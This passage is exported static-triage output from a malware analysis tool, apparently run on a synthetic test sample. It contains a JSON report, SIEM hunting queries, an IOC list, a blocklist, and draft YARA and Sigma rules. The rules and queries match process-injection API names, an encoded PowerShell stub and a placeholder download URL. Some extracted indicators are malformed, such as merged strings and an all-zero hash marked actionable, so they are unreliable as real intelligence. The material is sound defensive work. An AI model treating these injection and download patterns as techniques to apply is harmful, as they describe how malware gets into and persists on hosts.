  - attack.t1027
  - attack.t1071
`\`\`

## Hunting Queries
- http://example-malicious-test.com/bin HKCU\Software\BinarySample\Run powershell
  - Splunk: index=* "http://example-malicious-test.com/bin HKCU\Software\BinarySample\Run powershell"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "http://example-malicious-test.com/bin HKCU\Software\BinarySample\Run powershell"
  - Elastic: process.command_line : "*http://example-malicious-test.com/bin HKCU\Software\BinarySample\Run powershell*"
- 0000000000000000000000000000000000000000000000000000000000000000
  - Splunk: index=* "0000000000000000000000000000000000000000000000000000000000000000"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "0000000000000000000000000000000000000000000000000000000000000000"
  - Elastic: process.command_line : "*0000000000000000000000000000000000000000000000000000000000000000*"
- MZ_AUDIT_SAMPLE_NOT_A_REAL_PE VirtualAllocEx WriteProcessMemory CreateRemoteThread http://example-malicious-test.com/bin
  - Splunk: index=* "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE VirtualAllocEx WriteProcessMemory CreateRemoteThread http://example-malicious-test.com/bin"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE VirtualAllocEx WriteProcessMemory CreateRemoteThread http://example-malicious-test.com/bin"
  - Elastic: process.command_line : "*MZ_AUDIT_SAMPLE_NOT_A_REAL_PE VirtualAllocEx WriteProcessMemory CreateRemoteThread http://example-malicious-test.com/bin*"
```
### JSON
```json
{
  "sample": "sample3.bin",
  "byteLength": 498,
  "hashes": {
    "md5": "da78428a281d6b5de7e49b9f9ec016e7",
    "sha1": "e852364d84661311bd28c80ab4b2e0bf8784364a",
    "sha256": "78f1123bf46fe26cf8e7547202e5565141377ecaa4c44196c341e17e12be0102"
  },
  "entropy": 5.841777569060415,
  "score": 68,
  "scoreBreakdown": {
    "total": 68,
    "beh": 46,
    "iocScore": 7,
    "yaraScore": 0,
    "entScore": 3,
    "deobfScore": 0,
    "capScore": 12
  },
  "verdict": "HIGH THREAT",
  "staticMetadata": {
    "byteLength": 498,
    "lines": 2,
    "entropy": 5.841777569060415,
    "peTriage": {
      "detected": false,
      "hasMZ": false,
      "hasPE": false,
      "fileType": "No PE structure detected",
      "architecture": "Not available",
      "timestamp": null,
      "subsystem": null,
      "dllCharacteristics": [],
      "imageBase": null,
      "entryPointRva": null,
      "sections": [],
      "imports": [],
      "importDlls": [],
      "exports": [],
      "suspiciousApiStrings": [
        "VirtualAllocEx",
        "WriteProcessMemory",
        "CreateRemoteThread",
        "VirtualAlloc"
      ],
      "packedIndicators": [],
      "warnings": [],
      "realImportTableParsed": false,
      "packerHints": []
    }
  },
  "printableStrings": [
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)r",
    "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE",
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "http://example-malicious-test.com/bin",
    "HKCU\\Software\\BinarySample\\Run",
    "powershell -enc SQBFAFgA",
    "0000000000000000000000000000000000000000000000000000000000000000"
  ],
  "classifiedStrings": [
    {
      "type": "network",
      "val": "http://example-malicious-test.com/bin"
    }
  ],
  "stringsIntelligence": [
    {
      "name": "Network indicators",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "http://example-malicious-test.com/bin"
      ]
    },
    {
      "name": "URLs and domains",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "http://example-malicious-test.com/bin"
      ]
    },
    {
      "name": "Windows API strings",
      "confidence": "Medium",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "VirtualAllocEx",
        "WriteProcessMemory",
        "CreateRemoteThread"
      ]
    },
    {
      "name": "PowerShell strings",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "powershell -enc SQBFAFgA"
      ]
    },
    {
      "name": "Suspicious commands",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "powershell -enc SQBFAFgA"
      ]
    }
  ],
  "suspiciousApiDetection": {
    "suspiciousApiStrings": [
      "VirtualAllocEx",
      "WriteProcessMemory",
      "CreateRemoteThread",
      "VirtualAlloc"
    ],
    "apiRisk": [
      {
        "api": "VirtualAllocEx",
        "category": "Process injection",
        "risk": "High",
        "why": "Allocates memory inside another process, often before code injection.",
        "detectedAs": "string only"
      },
      {
        "api": "WriteProcessMemory",
        "category": "Process injection",
        "risk": "High",
        "why": "Writes bytes into another process, commonly paired with remote thread creation.",
        "detectedAs": "string only"
      },
      {
        "api": "CreateRemoteThread",
        "category": "Process injection",
        "risk": "High",
        "why": "Starts execution in a remote process.",
        "detectedAs": "string only"
      },
      {
        "api": "VirtualAlloc",
        "category": "Memory allocation",
        "risk": "Medium",
        "why": "Allocates executable memory for unpacking, shellcode, or loaders.",
        "detectedAs": "string only"
      }
    ]
  },
  "iocs": {
    "ips": [],
    "localIndicators": [],
    "urls": [
      "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell"
    ],
    "domains": [],
    "onion": [],
    "md5": [],
    "sha1": [],
    "sha256": [
      "0000000000000000000000000000000000000000000000000000000000000000"
    ],
    "emails": [],
    "registry": [
      "HKCU\\Software\\BinarySample\\Run\u0000powershell"
    ],
    "paths": [],
    "btc": [],
    "cve": [],
    "mutex": []
  },
  "iocActionability": [
    {
      "type": "url",
      "value": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "confidence": "Medium",
      "actionable": true,
      "reason": "URL indicator requiring validation.",
      "recommendedAction": "Validate reputation and consider DNS/proxy/URL block only if confirmed malicious."
    },
    {
      "type": "registry_key",
      "value": "HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "confidence": "High",
      "actionable": false,
      "reason": "Registry path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint telemetry and autoruns."
    },
    {
      "type": "hash",
      "value": "0000000000000000000000000000000000000000000000000000000000000000",
      "confidence": "High",
      "actionable": true,
      "reason": "Hash indicator",
      "recommendedAction": "Use for EDR hash hunts; block only after validation."
    }
  ],
  "mitre": [
    "T1027.010",
    "T1055",
    "T1027",
    "T1071"
  ],
  "attackTable": [
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027.010",
      "techniqueName": "Command Obfuscation",
      "observedEvidence": "Encoded PowerShell command — obfuscated payload delivery",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Encoded PowerShell command — obfuscated payload delivery\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1055",
      "techniqueName": "Process Injection",
      "observedEvidence": "Reflective DLL / process injection indicators",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Reflective DLL / process injection indicators\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027",
      "techniqueName": "Obfuscated Files or Info",
      "observedEvidence": "Large Base64 encoded blob — likely embedded payload",
      "confidence": "Medium",
      "detectionIdea": "Hunt for evidence containing \"Large Base64 encoded blob — likely embedded payload\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1071",
      "techniqueName": "Application Layer Protocol",
      "observedEvidence": "Technique inferred from IOC or static context",
      "confidence": "Medium",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    }
  ],
  "attackTimeline": [
    {
      "stage": "Execution",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery"
      ],
      "confidence": "Medium",
      "technique": "T1027.010",
      "validation": "Review process creation and script block logs."
    },
    {
      "stage": "Defense Evasion",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery",
        "Large Base64 encoded blob — likely embedded payload"
      ],
      "confidence": "High",
      "technique": "T1027.010",
      "validation": "Check security control tampering and obfuscation telemetry."
    },
    {
      "stage": "Payload Download",
      "evidence": [
        "Static text matched payload download keywords."
      ],
      "confidence": "Medium",
      "technique": null,
      "validation": "Validate network connections and downloaded file hashes."
    }
  ],
  "yaraHits": [],
  "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"Reflective DLL / process injection indicators\" nocase // behavior\n    $s3 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s4 = \"VirtualAllocEx\" nocase // Process injection\n    $s5 = \"WriteProcessMemory\" nocase // Process injection\n    $s6 = \"CreateRemoteThread\" nocase // Process injection\n    $s7 = \"VirtualAlloc\" nocase // Memory allocation\n    $s8 = \"HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\" nocase // artifact\n    $s9 = \"http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\" nocase // network\n    $s10 = \"http://example-malicious-test.com/bin\" nocase // Network indicators\n    $s11 = \"powershell -enc SQBFAFgA\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
  "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\"\n      - \"http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\"\n      - \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell -enc SQBFAFgA\u0000\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1055\n  - attack.t1027\n  - attack.t1071",
  "huntingQueries": [
    {
      "value": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "splunk": "index=* \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "elastic": "process.command_line : \"*http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell*\""
    },
    {
      "value": "0000000000000000000000000000000000000000000000000000000000000000",
      "splunk": "index=* \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "elastic": "process.command_line : \"*0000000000000000000000000000000000000000000000000000000000000000*\""
    },
    {
      "value": "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin",
      "splunk": "index=* \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\"",
      "elastic": "process.command_line : \"*MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin*\""
    }
  ],
  "detectionEngineering": {
    "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\"\n      - \"http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\"\n      - \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell -enc SQBFAFgA\u0000\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1055\n  - attack.t1027\n  - attack.t1071",
    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"Reflective DLL / process injection indicators\" nocase // behavior\n    $s3 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s4 = \"VirtualAllocEx\" nocase // Process injection\n    $s5 = \"WriteProcessMemory\" nocase // Process injection\n    $s6 = \"CreateRemoteThread\" nocase // Process injection\n    $s7 = \"VirtualAlloc\" nocase // Memory allocation\n    $s8 = \"HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\" nocase // artifact\n    $s9 = \"http://example-malicious-test.com/bin\u0000HKCU\\\\Software\\\\BinarySample\\\\Run\u0000powershell\" nocase // network\n    $s10 = \"http://example-malicious-test.com/bin\" nocase // Network indicators\n    $s11 = \"powershell -enc SQBFAFgA\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
    "splunk": [
      "index=* \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "index=* \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "index=* \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\""
    ],
    "defender": [
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"0000000000000000000000000000000000000000000000000000000000000000\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin\""
    ],
    "elastic": [
      "process.command_line : \"*http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell*\"",
      "process.command_line : \"*0000000000000000000000000000000000000000000000000000000000000000*\"",
      "process.command_line : \"*MZ_AUDIT_SAMPLE_NOT_A_REAL_PE\u0000VirtualAllocEx\u0000WriteProcessMemory\u0000CreateRemoteThread\u0000http://example-malicious-test.com/bin*\""
    ],
    "firewallBlocklist": [
      "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "0000000000000000000000000000000000000000000000000000000000000000"
    ],
    "dnsBlocklist": [],
    "edrHashHunts": [
      "Search endpoint file/process telemetry for hash 0000000000000000000000000000000000000000000000000000000000000000"
    ]
  },
  "threatIntelPivots": [
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "URLhaus",
      "url": "https://urlhaus.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/url/http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "url",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=http%3A%2F%2Fexample-malicious-test.com%2Fbin%00HKCU%5CSoftware%5CBinarySample%5CRun%00powershell",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "URL indicator requiring validation."
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "MalwareBazaar",
      "url": "https://bazaar.abuse.ch/browse.php?search=sha256%3A0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "0000000000000000000000000000000000000000000000000000000000000000",
      "normalizedValue": "0000000000000000000000000000000000000000000000000000000000000000",
      "type": "sha256",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/file/0000000000000000000000000000000000000000000000000000000000000000",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    }
  ],
  "skippedThreatIntelPivots": [
    {
      "ioc": "HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "normalizedValue": "HKCU\\Software\\BinarySample\\Run\u0000powershell",
      "type": "registry_key",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    }
  ],
  "deobfuscated": [],
  "blocklist": [
    "http://example-malicious-test.com/bin\u0000HKCU\\Software\\BinarySample\\Run\u0000powershell",
    "0000000000000000000000000000000000000000000000000000000000000000"
  ]
}
```
### IOC CSV
```csv
type,value,source,confidence,notes
url,http://example-malicious-test.com/bin HKCU\Software\BinarySample\Run powershell,ThreatRecon local extraction,Medium,actionable=yes | URL indicator requiring validation. | Validate reputation and consider DNS/proxy/URL block only if confirmed malicious.
registry_key,HKCU\Software\BinarySample\Run powershell,ThreatRecon local extraction,High,actionable=no | Registry path is a host hunt indicator | Hunt endpoint telemetry and autoruns.
hash,0000000000000000000000000000000000000000000000000000000000000000,ThreatRecon local extraction,High,actionable=yes | Hash indicator | Use for EDR hash hunts; block only after validation.
```
### Blocklist
```text
# ThreatRecon blocklist export
# Actionable public IPs, domains, URLs, and hashes only
# Local/private, reserved documentation, demo/test, and known public resolver indicators are excluded.
http://example-malicious-test.com/bin HKCU\Software\BinarySample\Run powershell
0000000000000000000000000000000000000000000000000000000000000000
```
### YARA
```yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "Reflective DLL / process injection indicators" nocase // behavior
    $s3 = "Large Base64 encoded blob — likely embedded payload" nocase // behavior
    $s4 = "VirtualAllocEx" nocase // Process injection
    $s5 = "WriteProcessMemory" nocase // Process injection
    $s6 = "CreateRemoteThread" nocase // Process injection
    $s7 = "VirtualAlloc" nocase // Memory allocation
    $s8 = "HKCU\\Software\\BinarySample\\Run powershell" nocase // artifact
    $s9 = "http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell" nocase // network
    $s10 = "http://example-malicious-test.com/bin" nocase // Network indicators
    $s11 = "powershell -enc SQBFAFgA" nocase // PowerShell strings
  condition:
    3 of them
}
```
### Sigma
```yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "HKCU\\Software\\BinarySample\\Run powershell"
      - "http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell"
      - "MZ_AUDIT_SAMPLE_NOT_A_REAL_PE VirtualAllocEx WriteProcessMemory CreateRemoteThread http://example-malicious-test.com/bin HKCU\\Software\\BinarySample\\Run powershell -enc SQBFAFgA "
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1055
  - attack.t1027
  - attack.t1071
```

